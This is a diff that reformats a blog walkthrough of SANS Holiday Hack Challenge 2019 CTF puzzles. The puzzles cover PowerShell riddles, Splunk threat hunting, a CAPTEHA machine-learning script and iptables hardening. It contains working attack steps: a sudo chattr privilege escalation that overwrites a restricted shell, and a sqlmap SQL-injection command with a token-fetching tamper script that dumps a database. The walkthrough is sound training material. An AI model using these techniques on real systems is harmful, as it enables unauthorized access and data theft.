 The &#8220;depths&#8221; directory matches clues in the riddle, so search in there for a file with the md5 hash of &#8220;25520151A320B5B0D21561F92C8F6224&#8221;. To do so will require a couple lines of commands. You can use shortcuts for common PowerShell cmdlets such as &#8220;gci&#8221; for &#8220;Get-ChildItem&#8221;.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PS /home/elf> gci -File -Recurse -Depth 2 -Path 'depths' | Get-FileHash -Algorith MD5 | Format-List > out.txt 
+```
+PS /home/elf> gci -File -Recurse -Depth 2 -Path 'depths' | Get-FileHash -Algorith MD5 | Format-List > out.txt 
 PS /home/elf> gc out.txt | Select-String -Pattern "25520151A320B5B0D21561F92C8F6224" -SimpleMatch -Context 1,1
 
   Algorithm : MD5
 > Hash      : 25520151A320B5B0D21561F92C8F6224
-  Path      : /home/elf/depths/produce/thhy5hll.txt</pre>
+  Path      : /home/elf/depths/produce/thhy5hll.txt
+  ```
 
 The discovered file gives you another laser parameter value and the next riddle.
 
 #### Riddle 5 &#8211; Deepest Directory
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PS /home/elf> gc /home/elf/depths/produce/thhy5hll.txt
+```
+PS /home/elf> gc /home/elf/depths/produce/thhy5hll.txt
 temperature?val=-33.5
 
-I am one of many thousand similar txt's contained within the deepest of /home/elf/depths. Finding me will give you the most strength but doing so will require Piping all the FullName's to Sort Length.</pre>
+I am one of many thousand similar txt's contained within the deepest of /home/elf/depths. Finding me will give you the most strength but doing so will require Piping all the FullName's to Sort Length.
+```
 
 The PowerShell code to solve this riddle&#8217;s clue is kind of complex:  
 First recursively list out directory contents of &#8220;depths&#8221;.  
 Second, Select the objects&#8217; full pathname and calculate the length of the paths.  
 Third, sort against the calculated length and display the output.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PS /home/elf> gci "./*" -File -Recurse -Path "depths" | select-object FullName, @{Name="Nlength";Expression={$_.FullName.Length}} | sort-object Nlength | Format-List
+```
+PS /home/elf> gci "./*" -File -Recurse -Path "depths" | select-object FullName, @{Name="Nlength";Expression={$_.FullName.Length}} | sort-object Nlength | Format-List
 ...
 FullName : /home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown/escape/v
            ote/long/writer/behind/ahead/thin/occasionally/explore/tape/wherever/practical/therefo
            re/cool/plate/ice/play/truth/potatoes/beauty/fourth/careful/dawn/adult/either/burn/end
            /accurate/rubbed/cake/main/she/threw/eager/trip/to/soon/think/fall/is/greatest/become/
            accident/labor/sail/dropped/fox/0jhj5xz6.txt
-Nlength  : 388</pre>
+Nlength  : 388
+```
 
 Dump the contents of the file to see the next riddle.
 
 #### Riddle 6 &#8211; Kill their Jobs
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PS /home/elf> gc /home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown/escape/vote/long/writer/behind/ahead/thin/occasionally/explore/tape/wherever/practical/therefore/cool/plate/ice/play/truth/potatoes/beauty/fourth/careful/dawn/adult/either/burn/end/accurate/rubbed/cake/main/she/threw/eager/trip/to/soon/think/fall/is/greatest/become/accident/labor/sail/dropped/fox/0jhj5xz6.txt
+```
+PS /home/elf> gc /home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown/escape/vote/long/writer/behind/ahead/thin/occasionally/explore/tape/wherever/practical/therefore/cool/plate/ice/play/truth/potatoes/beauty/fourth/careful/dawn/adult/either/burn/end/accurate/rubbed/cake/main/she/threw/eager/trip/to/soon/think/fall/is/greatest/become/accident/labor/sail/dropped/fox/0jhj5xz6.txt
 Get process information to include Username identification. Stop Process to show me you're skilled and in this order they must be killed:
 
 bushy
@@ -595,26 +647,30 @@ alabaster
 minty
 holly
 
-Do this for me and then you /shall/see .</pre>
+Do this for me and then you /shall/see .
+```
 
 In this riddle, you have to list processes by owner and kill those in a certain order.  
-First, use the command &#8220;Get-Process -IncludeUserName&#8221; to list those jobs.  
-Second, use &#8220;Stop-Process -ID -Force&#8221; to kill processes by their ID.  
-If you kill the processes in the correct order, you will get the next riddle in a file called &#8220;/home/elf/shall/see&#8221;
+First, use the command `Get-Process -IncludeUserName` to list those jobs.  
+Second, use `Stop-Process -ID -Force` to kill processes by their ID.  
+If you kill the processes in the correct order, you will get the next riddle in a file called `/home/elf/shall/see`
 
 #### Riddle 7 &#8211; Event Log ID&#8217;s
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PS /home/elf> Get-Content /shall/see
+```
+PS /home/elf> Get-Content /shall/see
 Get the .xml children of /etc - an event log to be found. Group all .Id's and the last thing will 
-be in the Properties of the lonely unique event Id.</pre>
+be in the Properties of the lonely unique event Id.
+```
 
 This riddle wants you to parse through an EventLog and group events by Id. The solution will involve the event that is in its own group. 
 
-To solve this riddle, first, find the XML file in &#8220;/etc&#8221; using the command &#8220;Get-ChildItem -Recurse -Path &#8220;/etc/&#8221; -Include &#8220;*.xml&#8221;.  
-Second, change to the directory of the file that was found to make the rest easier, &#8220;cd /etc/systemd/system/timers.target.wants/&#8221;.  
-Third, use &#8220;Select-String -Path ./EventLog.xml -Pattern &#8216;N=&#8221;Id&#8221;>(.*)<&#8216; -AllMatches&#8221; to parse the event log for matches to the specified regular expression. That will collect all the event id&#8217;s since they begin with &#8216;<I32 N=&#8221;Id&#8221;>&#8217; tag. To verify that you can dump the contents of EventLog.xml and look for some of the described tags. Pipe the matches into a &#8220;Group-Object&#8221; command by their value, using &#8220;| % {$_.matches.groups[1].value} | Group-Object&#8221;.
+To solve this riddle, first, find the XML file in &#8220;/etc&#8221; using the command `Get-ChildItem -Recurse -Path "/etc/" -Include "*.xml"`.  
+Second, change to the directory of the file that was found to make the rest easier, `cd /etc/systemd/system/timers.target.wants/`.  
+Third, use `Select-String -Path ./EventLog.xml -Pattern ‘N=”Id”>(.*)<‘ -AllMatches` to parse the event log for matches to the specified regular expression. That will collect all the event id&#8217;s since they begin with &#8216;<I32 N=&#8221;Id&#8221;>&#8217; tag. To verify that you can dump the contents of EventLog.xml and look for some of the described tags. Pipe the matches into a &#8220;Group-Object&#8221; command by their value, using `| % {$_.matches.groups[1].value} | Group-Object`.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PS /etc/systemd/system/timers.target.wants> Select-String -Path ./EventLog.xml -Pattern 'N="Id">(.*)&lt;' -AllMatches | % {$_.matches.groups[1].value} | Group-Object
+```
+PS /etc/systemd/system/timers.target.wants> Select-String -Path ./EventLog.xml -Pattern 'N="Id">(.*)<' -AllMatches | % {$_.matches.groups[1].value} | Group-Object
 
 Count Name                      Group
 ----- ----                      -----
@@ -623,15 +679,17 @@ Count Name                      Group
   179 3                         {3, 3, 3, 3…}
     2 4                         {4, 4}
   905 5                         {5, 5, 5, 5…}
-   98 6                         {6, 6, 6, 6…}</pre>
+   98 6                         {6, 6, 6, 6…}
+```
 
-The EventID that is all alone is &#8220;1&#8221;. Search for it in the file with a command like &#8220;Select-String -Path ./EventLog.xml -Pattern &#8216;N=&#8221;id&#8221;>1<&#8216; -Context 8,200&#8243; and look for soemthing interesting in its Properties. You should find the last laser parameter needed.
+The EventID that is all alone is &#8220;1&#8221;. Search for it in the file with a command like `Select-String -Path ./EventLog.xml -Pattern ‘N=”id”>1<‘ -Context 8,200` and look for soemthing interesting in its Properties. You should find the last laser parameter needed.
 
 #### Parameters
 
 First, get information about the API using the command included in the bannertext of the terminal challenge. It shows how to set the variables needed to calibrate the laser.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PS /home/elf> (Invoke-WebRequest -Uri http://localhost:1225/).RawContent
+```
+PS /home/elf> (Invoke-WebRequest -Uri http://localhost:1225/).RawContent
 HTTP/1.0 200 OK                                                                                   
 Server: Werkzeug/0.16.0                                                                           
 Server: Python/3.6.9                                                                              
@@ -639,9 +697,9 @@ Date: Sat, 11 Jan 2020 05:09:18 GMT
 Content-Type: text/html; charset=utf-8
 Content-Length: 860
 
-&lt;html>
-&lt;body>
-&lt;pre>
+<html>
+<body>
+<pre>
 ----------------------------------------------------
 Christmas Cheer Laser Project Web API
 ----------------------------------------------------
@@ -666,32 +724,44 @@ POST http://localhost:1225/api/gas
 POST BODY EXAMPLE (gas mixture percentages):
 O=5&H=5&He=5&N=5&Ne=20&Ar=10&Xe=10&F=20&Kr=10&Rn=10
 ----------------------------------------------------
-&lt;/pre>
-&lt;/body>
-&lt;/html></pre>
+</pre>
+</body>
+</html>
+```
 
-Parameter Angle:  
+##### Parameter Angle:  
 Found in Riddle 1  
 Command is (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent
 
-Parameter Refraction:  
+##### Parameter Refraction:  
 Found in Riddle 3  
 refraction?val=1.867  
 Command is (Invoke-WebRequest http://127.0.0.1:1225/api/refraction?val=1.867).RawContent 
 
-Parameter Temperature:  
+##### Parameter Temperature:  
 Found in Riddle 4  
 temperature?val=-33.5  
 Command is (Invoke-WebRequest http://127.0.0.1:1225/api/temperature?val=-33.5).RawContent 
 
-Parameter Gases:  
+##### Parameter Gases:  
 Found in Riddle 7  
-powershell.exe -c &#8220;\`$correct\_gases\_postbody = @{\`n O=6\`n H=7\`n He=3\`n N=4\`n Ne=22\`n Ar=11\`n Xe=10\`n F=20\`n Kr=8\`n Rn=9\`n}\`n&#8221;<  
-Command is (Invoke-WebRequest -Uri &#8220;http://127.0.0.1:1225/api/gas?val=65.5&#8221; -Method POST -Body &#8220;O=6&H=7&He=3&N=4&Ne=22&Ar=11&Xe=10&F=20&Kr=8&Rn=9&#8221;).RawContent 
+powershell.exe -c "\`$correct\_gases\_postbody = @{
+O=6
+H=7
+He=3
+N=4
+Ne=22
+Ar=11
+Xe=10
+F=20
+Kr=8
+Rn=9}"
+Command is `(Invoke-WebRequest -Uri “http://127.0.0.1:1225/api/gas?val=65.5” -Method POST -Body “O=6&H=7&He=3&N=4&Ne=22&Ar=11&Xe=10&F=20&Kr=8&Rn=9”).RawContent`
 
 After inputting those API commands, check the output with &#8220;/api/output&#8221; to complete the challenge.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PS /home/elf> (Invoke-WebRequest http://127.0.0.1:1225/api/output).RawContent        
+```
+PS /home/elf> (Invoke-WebRequest http://127.0.0.1:1225/api/output).RawContent        
 HTTP/1.0 200 OK                                                                                   
 Server: Werkzeug/0.16.0                                                                           
 Server: Python/3.6.9                                                                              
@@ -699,7 +769,8 @@ Date: Sat, 11 Jan 2020 05:25:25 GMT
 Content-Type: text/html; charset=utf-8
 Content-Length: 200
 
-Success! - 6.76 Mega-Jollies of Laser Output Reached!</pre>
+Success! - 6.76 Mega-Jollies of Laser Output Reached!
+```
 
 The hint that Sparkle Redberry gives after completing the challenge is:
 
@@ -779,7 +850,9 @@ What is the fully-qualified domain name(FQDN) of the command and control(C2) ser
 
 To find the answer, search:
 
-<pre class="wp-block-preformatted">sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=3 powershell</pre>
+```
+sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=3 powershell
+```
 
 Then look at the Interesting Field &#8220;dest_host&#8221; on the left of the page.
 
@@ -791,7 +864,9 @@ What document is involved with launching the malicious PowerShell code? Please p
 
 Follow Alice Bluebird&#8217;s instructions by first searching for:
 
-<pre class="wp-block-preformatted">index=main sourcetype="WinEventLog:Microsoft-Windows-Powershell/Operational" | reverse</pre>
+```
+index=main sourcetype="WinEventLog:Microsoft-Windows-Powershell/Operational" | reverse
+```
 
 Then follow her instructions to pivot on time:
 
@@ -1000,7 +1075,9 @@ When you fill in the info fields and check the CAPTEHA box it presents the chall
 
 To inspect this screen a little closer, you can use the Developer Tools Console in your browser, and enter this code to change the timeout value:
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$('#timer').text('9000')</pre>
+```
+$('#timer').text('9000')
+```
 
 Even with the timer set to something ridiculous, you can select all the proper images, but still not be able to pass the challenge.
 
@@ -1024,7 +1101,8 @@ When trying to use the command &#8220;su&#8221; to get into alabaster&#8217;s ac
 
 Dumping &#8220;/etc/passwd&#8221; shows that alabaster&#8217;s shell is set to &#8220;/bin/nsh&#8221;.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">elf@2e974b2f04ac:~$ cat /etc/passwd
+```
+elf@2e974b2f04ac:~$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -1045,25 +1123,30 @@ gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologi
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
 elf:x:1000:1000::/home/elf:/bin/bash
-alabaster_snowball:x:1001:1001::/home/alabaster_snowball:/bin/nsh</pre>
+alabaster_snowball:x:1001:1001::/home/alabaster_snowball:/bin/nsh
+```
 
 If you try to use &#8220;chsh&#8221; to change alabaster&#8217;s shell the normal way if fails for some reason. So we have to replace &#8220;nsh&#8221; with &#8220;bash&#8221; to get the right shell in place.
 
-Alabaster gives a hint about immutable files when talking to him, and &#8220;nsh&#8221; is indeed one of them. To verify, use the command &#8220;lsattr /bin/nsh&#8221;. However, upon Alabaster&#8217;s other hint about &#8220;sudo -l&#8221;, you&#8217;ll see that you have access to &#8220;chattr&#8221;.
+Alabaster gives a hint about immutable files when talking to him, and &#8220;nsh&#8221; is indeed one of them. To verify, use the command `lsattr /bin/nsh`. However, upon Alabaster&#8217;s other hint about `sudo -l`, you&#8217;ll see that you have access to `chattr`.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">elf@2e974b2f04ac:~$ sudo -l
+```
+elf@2e974b2f04ac:~$ sudo -l
 Matching Defaults entries for elf on 2e974b2f04ac:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
 User elf may run the following commands on 2e974b2f04ac:
-    (root) NOPASSWD: /usr/bin/chattr</pre>
+    (root) NOPASSWD: /usr/bin/chattr
+```
 
-Use &#8220;chattr&#8221; to modify &#8220;nsh&#8221;, and then copy bash into it.
+Use `chattr` to modify `nsh`, and then copy bash into it.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">sudo chattr -i /bin/nsh; cp /bin/bash /bin/nsh</pre>
+```
+sudo chattr -i /bin/nsh; cp /bin/bash /bin/nsh
+```
 
-Use &#8220;su&#8221; to log in as alabaster_snowball and you&#8217;ll beat the challenge.
+Use `su` to log in as alabaster_snowball and you&#8217;ll beat the challenge.
 
 ### Hint
 
@@ -1087,7 +1170,8 @@ The idea is to do as much of the processing as possible BEFORE creating the web 
 
 The main() function could look something like this:
 
-<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">def main():
+```python
+def main():
     yourREALemailAddress = "dwatts.comptech@gmail.com"
 
     # Loading the Trained Machine Learning Model created from running retrain.py on the training_images directory
@@ -1124,7 +1208,7 @@ The main() function could look something like this:
         threading.Thread(target=predict_image, args=(q, sess, graph, image_bytes, image_uuid, labels, input_operation, output_operation)).start()
     
     print('Waiting For Threads to Finish...')
-    while q.qsize() &lt; len(unknown_images):
+    while q.qsize() < len(unknown_images):
         time.sleep(0.001)
     
     #getting a list of all threads returned results
@@ -1132,17 +1216,19 @@ The main() function could look something like this:
     
     # This should be JUST a csv list image uuids ML predicted to match the challenge_image_type .
     final_answer = ','.join( [ prediction['image_uuid'] for prediction in prediction_results if prediction['prediction'] in challenge_image_types ] )
-</pre>
+```
 
 After running the time-optimized code, you&#8217;ll win the contest and you&#8217;ll receive an email with the Objective solution inside.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">...
+```
+...
 Submitting lots of entries until we win the contest! Entry #104
 Submitting lots of entries until we win the contest! Entry #105
 Submitting lots of entries until we win the contest! Entry #106
 Submitting lots of entries until we win the contest! Entry #107
 Submitting lots of entries until we win the contest! Entry #108
-{"data":"&lt;h2 id=\"result_header\"> Entries for email address #################### no longer accepted as our systems show your email was already randomly selected as a winner! Go check your email to get your winning code. Please allow up to 3-5 minutes for the email to arrive in your inbox or check your spam filter settings. &lt;br>&lt;br> Congratulations and Happy Holidays!&lt;/h2>","request":true}</pre>
+{"data":"<h2 id=\"result_header\"> Entries for email address #################### no longer accepted as our systems show your email was already randomly selected as a winner! Go check your email to get your winning code. Please allow up to 3-5 minutes for the email to arrive in your inbox or check your spam filter settings. <br><br> Congratulations and Happy Holidays!</h2>","request":true}
+```
 
 [<img src="/assets/uploads/2020/01/image-27.png" alt="" class="wp-image-609" srcset="/assets/uploads/2020/01/image-27.png 876w, /assets/uploads/2020/01/image-27-300x217.png 300w, /assets/uploads/2020/01/image-27-768x556.png 768w" sizes="(max-width: 876px) 100vw, 876px" />](/assets/uploads/2020/01/image-27.png)
 
@@ -1248,7 +1334,7 @@ The attacker pivoted to another workstation using credentials gained from Minty&
   </p>
 </blockquote>
 
-Pivot on time by going to the last event in the previous results, which has a command of &#8220;cmd \c exit&#8221;. Click on &#8220;Show surrounding messages&#8221; button and select 1 minute. Within these results search for network connections from the attacker&#8217;s address &#8220;192.168.247.175&#8221;. All four of them are using &#8220;alabaster&#8221; as the account.
+Pivot on time by going to the last event in the previous results, which has a command of `cmd \c exit`. Click on &#8220;Show surrounding messages&#8221; button and select 1 minute. Within these results search for network connections from the attacker&#8217;s address &#8220;192.168.247.175&#8221;. All four of them are using &#8220;alabaster&#8221; as the account.
 
 #### Question&nbsp;7:
 
@@ -1324,13 +1410,16 @@ There are two pages in the Student Portal that are vulnerable to SQL injection. 
 
 #### SQL Command
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">sqlmap -u "https://studentportal.elfu.org/application-check.php?elfmail=elfelif@nowhere.net*" --tamper="hhctamper.py" --skip-urlencode -v2 -o --prefix="'" --suffix=" -- " -D "elfu"</pre>
+```
+sqlmap -u "https://studentportal.elfu.org/application-check.php?elfmail=elfelif@nowhere.net*" --tamper="hhctamper.py" --skip-urlencode -v2 -o --prefix="'" --suffix=" -- " -D "elfu"
+```
 
 There is an authentication token that expires too quickly to use in a command like this, since you have to first generate the token with a request to &#8220;validator.php&#8221; and by the time you can type it into a sqlmap command it&#8217;s already expired. That&#8217;s where the hint about tamper scripts comes in. Use Sqlmap&#8217;s tamper script functionality and make a call to get the token before using the returned data in the call to &#8220;application-check.php&#8221;.
 
 #### Tamper Script
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#!/usr/bin/python
+```
+#!/usr/bin/python
 
 import base64
 import urllib
@@ -1338,17 +1427,18 @@ import requests
 
 
 def tamper(payload, **kwargs):
-	token = requests.get("https://studentportal.elfu.org/validator.php").text
-	data = payload + "&token=" + token
+    token = requests.get("https://studentportal.elfu.org/validator.php").text
+    data = payload + "&token=" + token
 
-	return data
-</pre>
+    return data
+```
 
 #### Database
 
 The database to dump is &#8220;elfu&#8221; and it has three user tables, &#8220;applications&#8221;, &#8220;students&#8221;, and &#8220;krampus&#8221;. The &#8220;applications&#8221; table is way too large to dump as it holds attempts from thousands of people at the convention, so skip dumping that one with Ctrl-C at the time. The &#8220;krampus&#8221; table is what holds the scraps of paper.
 
-<pre class="wp-block-preformatted">Table: krampus
+```
+Table: krampus
  [6 entries]
  +----+-----------------------+
  | id | path                  |
@@ -1359,7 +1449,8 @@ The database to dump is &#8220;elfu&#8221; and it has three user tables, &#8220;
  | 4  | /krampus/667d6896.png |
  | 5  | /krampus/adb798ca.png |
  | 6  | /krampus/ba417715.png |
- +----+-----------------------+</pre>
+ +----+-----------------------+
+```
 
 #### Paper Scraps
 
@@ -1529,7 +1620,7 @@ Find the font-family property in the HTML head.
   </p>
 </blockquote>
 
-Search for &#8220;eggs&#8221; in the HTML for an element with a class of &#8220;eggs&#8221;. Highlight the found element and look at its &#8220;Event Listeners&#8221;. There is a listener for &#8220;spoil&#8221; and the handler makes assigns &#8216;VERONICA&#8217; = &#8216;sad'&#8221;. Type in VERONICA.
+Search for &#8220;eggs&#8221; in the HTML for an element with a class of &#8220;eggs&#8221;. Highlight the found element and look at its &#8220;Event Listeners&#8221;. There is a listener for &#8220;spoil&#8221; and the handler makes assigns 'VERONICA = sad'. Type in VERONICA.
 
 [<img src="/assets/uploads/2020/01/image-41-1024x737.png" alt="" class="wp-image-633" srcset="/assets/uploads/2020/01/image-41-1024x737.png 1024w, /assets/uploads/2020/01/image-41-300x216.png 300w, /assets/uploads/2020/01/image-41-768x553.png 768w, /assets/uploads/2020/01/image-41.png 1280w" sizes="(max-width: 1024px) 100vw, 1024px" />](/assets/uploads/2020/01/image-41.png)
 
@@ -1600,16 +1691,16 @@ There are 6 rules that need to be applied with &#8220;[iptables](https://linux.d
 
 And here are commands to use for inputting them in relative order:
 
-1) elfuuser@25f4a0a345d9:~$ sudo iptables -P FORWARD DROP  
+1. elfuuser@25f4a0a345d9:~$ sudo iptables -P FORWARD DROP  
 elfuuser@25f4a0a345d9:~$ sudo iptables -P OUTPUT DROP  
 elfuuser@25f4a0a345d9:~$ sudo iptables -P INPUT DROP  
-2) sudo iptables -A INPUT -m conntrack &#8211;ctstate ESTABLISHED,RELATED -j ACCEPT  
+2. sudo iptables -A INPUT -m conntrack &#8211;ctstate ESTABLISHED,RELATED -j ACCEPT  
 sudo iptables -A OUTPUT -m conntrack &#8211;ctstate ESTABLISHED,RELATED -j ACCEPT  
-3) sudo iptables -A INPUT -p tcp -s 172.19.0.225 &#8211;dport 22 -m conntrack &#8211;ctstate NEW,ESTABLISHED -j ACCEPT  
-4) sudo iptables -A INPUT -p tcp &#8211;dport 21 -m conntrack &#8211;ctstate NEW,ESTABLISHED -j ACCEPT  
+3. sudo iptables -A INPUT -p tcp -s 172.19.0.225 &#8211;dport 22 -m conntrack &#8211;ctstate NEW,ESTABLISHED -j ACCEPT  
+4. sudo iptables -A INPUT -p tcp &#8211;dport 21 -m conntrack &#8211;ctstate NEW,ESTABLISHED -j ACCEPT  
 sudo iptables -A INPUT -p tcp &#8211;dport 80 -m conntrack &#8211;ctstate NEW,ESTABLISHED -j ACCEPT  
-5) sudo iptables -A OUTPUT -p tcp &#8211;dport 80 -m conntrack &#8211;ctstate NEW,ESTABLISHED -j ACCEPT  
-6) sudo iptables -A INPUT -i lo -j ACCEPT
+5. sudo iptables -A OUTPUT -p tcp &#8211;dport 80 -m conntrack &#8211;ctstate NEW,ESTABLISHED -j ACCEPT  
+6. sudo iptables -A INPUT -i lo -j ACCEPT
 
 #### Hint
 
